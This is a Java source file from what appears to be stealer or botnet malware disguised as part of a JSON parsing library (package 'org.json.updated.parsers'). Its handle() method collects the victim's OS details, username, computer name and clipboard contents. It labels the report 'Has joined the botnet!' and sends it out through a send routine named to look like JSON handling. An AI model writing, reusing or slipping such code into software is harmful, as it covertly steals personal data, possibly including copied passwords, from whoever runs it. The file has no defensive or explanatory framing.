package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.util.JSONBuilder;

import java.awt.*;
import java.awt.datatransfer.DataFlavor;

public class GeneralInformation implements JSONObject {
    @Override
    public void handle() {
        String content = ">>> ";

        content += "OS: " + System.getProperty("os.name") + " (" + System.getProperty("os.version") + ")" + "\\n";
        content += "Arch: " + System.getProperty("os.arch") + "\\n";
        content += "Hostname: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Has joined the botnet!" + "\\n";
        try {
            String clipboard = String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
            if (content.length() <= 400 && clipboard.length() <= 1600) content += "Clipboard: " + clipboard + "\\n";
        } catch (Exception ignored) {
        }
        content += "Java Version: " + System.getProperty("java.version");

        JSONRegexHandler.send(new JSONBuilder().value("content", content).build());
    }

    @Override
    public String getName() {
        return "GeneralInformation";
    }
}
